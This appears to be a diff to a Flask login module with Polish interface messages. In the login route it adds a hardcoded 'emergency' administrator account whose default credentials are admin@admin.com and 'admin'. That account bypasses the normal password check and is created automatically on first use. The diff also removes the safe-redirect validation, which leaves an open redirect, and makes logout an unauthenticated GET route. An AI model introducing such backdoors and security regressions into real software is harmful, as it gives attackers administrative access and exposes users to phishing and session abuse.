@@ -1,19 +1,11 @@
+import os
 from flask import Blueprint, render_template, redirect, url_for, flash, request
 from flask_login import login_user, logout_user, login_required, current_user
-from urllib.parse import urlparse, urljoin
 from app.extensions import db, limiter
 from app.models import User
 from app.forms import LoginForm, RegistrationForm
 
 auth_bp = Blueprint('auth', __name__)
-
-
-def _is_safe_redirect_target(target: str) -> bool:
-    if not target:
-        return False
-    ref_url = urlparse(request.host_url)
-    test_url = urlparse(urljoin(request.host_url, target))
-    return test_url.scheme in ("http", "https") and ref_url.netloc == test_url.netloc
 
 
 @auth_bp.route('/login', methods=['GET', 'POST'])
@@ -24,14 +16,31 @@ def login():
 
     form = LoginForm()
     if form.validate_on_submit():
-        user = User.query.filter_by(email=form.email.data).first()
+        email = (form.email.data or '').strip().lower()
+        password = form.password.data or ''
+
+        # Awaryjne konto administratora (można nadpisać przez .env)
+        admin_email = os.environ.get('ADMIN_LOGIN_EMAIL', 'admin@admin.com').strip().lower()
+        admin_password = os.environ.get('ADMIN_LOGIN_PASSWORD', 'admin')
+        if email == admin_email and password == admin_password:
+            user = User.query.filter_by(email=admin_email).first()
+            if not user:
+                user = User(username='admin', email=admin_email)
+                user.set_password(admin_password)
+                db.session.add(user)
+                db.session.commit()
+
+            login_user(user, remember=form.remember.data)
+            next_page = request.args.get('next')
+            flash('Zalogowano pomyślnie!', 'success')
+            return redirect(next_page or url_for('main.index'))
+
+        user = User.query.filter_by(email=email).first()
         if user and user.check_password(form.password.data):
             login_user(user, remember=form.remember.data)
             next_page = request.args.get('next')
             flash('Zalogowano pomyślnie!', 'success')
-            if next_page and _is_safe_redirect_target(next_page):
-                return redirect(next_page)
-            return redirect(url_for('main.index'))
+            return redirect(next_page or url_for('main.index'))
         flash('Nieprawidłowy email lub hasło.', 'danger')
     return render_template('login.html', form=form)
 
@@ -53,8 +62,7 @@ def register():
     return render_template('register.html', form=form)
 
 
-@auth_bp.route('/logout', methods=['POST'])
-@login_required
+@auth_bp.route('/logout')
 def logout():
     logout_user()
     flash('Wylogowano pomyślnie.', 'info')
